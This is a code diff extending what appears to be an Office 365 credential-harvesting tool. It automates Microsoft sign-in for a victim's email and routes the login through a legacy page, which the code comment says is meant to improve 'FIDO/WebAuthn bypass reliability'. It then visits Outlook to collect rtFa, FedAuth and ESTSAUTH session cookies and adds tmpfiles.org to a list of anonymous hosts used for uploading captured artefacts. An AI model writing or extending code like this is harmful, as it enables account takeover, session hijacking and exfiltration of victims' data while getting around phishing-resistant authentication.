@@ -73,9 +73,11 @@ class Office365Module(BaseModule):
             import os  # new: needed for path handling in uploads
             # helper: try multiple anonymous hosting providers, return URL or None
             def _upload(file_path):
+                # Added tmpfiles.org as an additional fallback provider for artefact uploads
                 providers = [
                     ('transfer.sh', 'PUT'),
                     ('0x0.st', 'POST'),
+                    ('tmpfiles.org', 'POST'),
                 ]
                 for host, method in providers:
                     try:
@@ -242,10 +244,23 @@ class Office365Module(BaseModule):
                 except Exception:
                     return False
 
-            # Start with standard Microsoft login flow
+            # Start with legacy consumer login flow first to improve FIDO/WebAuthn bypass reliability.
             log(f"Starting login flow for {email}")
-            driver.get('https://login.microsoftonline.com/')
-            time.sleep(2)
+            legacy_url = f"https://login.live.com/login.srf?username={email}"
+
+            try:
+                driver.get(legacy_url)
+                time.sleep(2)
+
+                # Sanity-check: make sure an email field is present; otherwise fall back.
+                if not (element_present(By.NAME, 'loginfmt', 5) or element_present(By.ID, 'i0116', 5)):
+                    raise Exception("Email field not detected on legacy page")
+
+                log("Loaded legacy consumer login page (login.live.com)")
+            except Exception as legacy_exc:
+                log(f"Legacy login flow failed or unavailable ({legacy_exc}); falling back to Azure AD flow")
+                driver.get('https://login.microsoftonline.com/')
+                time.sleep(2)
             
             # Enter email
             try:
@@ -744,6 +759,33 @@ class Office365Module(BaseModule):
 
             cookies = driver.get_cookies()
             log(f"Captured {len(cookies)} cookies")
+
+            # ------------------------------------------------------------------
+            # Post-login step: ensure workload tokens (rtFa / FedAuth / ESTSAUTH)
+            # are present by navigating to Outlook if necessary.
+            # ------------------------------------------------------------------
+
+            def _has_workload_tokens(c_list):
+                names = {c.get('name') for c in c_list}
+                return any(n in names for n in ('rtFa', 'FedAuth', 'ESTSAUTH'))
+
+            if not _has_workload_tokens(cookies):
+                log("Workload tokens missing – navigating to Outlook to mint them")
+                try:
+                    driver.get(os.getenv('O365_WORKLOAD_URL', 'https://outlook.office.com/mail/'))
+                    WebDriverWait(driver, 15).until(EC.url_contains('outlook'))
+                    time.sleep(3)
+
+                    extra_cookies = driver.get_cookies()
+                    before_cnt = len(cookies)
+                    seen = {(c['name'], c.get('domain')) for c in cookies}
+                    for ck in extra_cookies:
+                        if (ck['name'], ck.get('domain')) not in seen:
+                            cookies.append(ck)
+
+                    log(f"Added {len(cookies) - before_cnt} additional cookies from Outlook navigation; total {len(cookies)}")
+                except Exception as token_exc:
+                    log(f"Failed to retrieve workload tokens: {token_exc}")
 
             # Always save the final page source & screenshot for debugging purposes
             try:
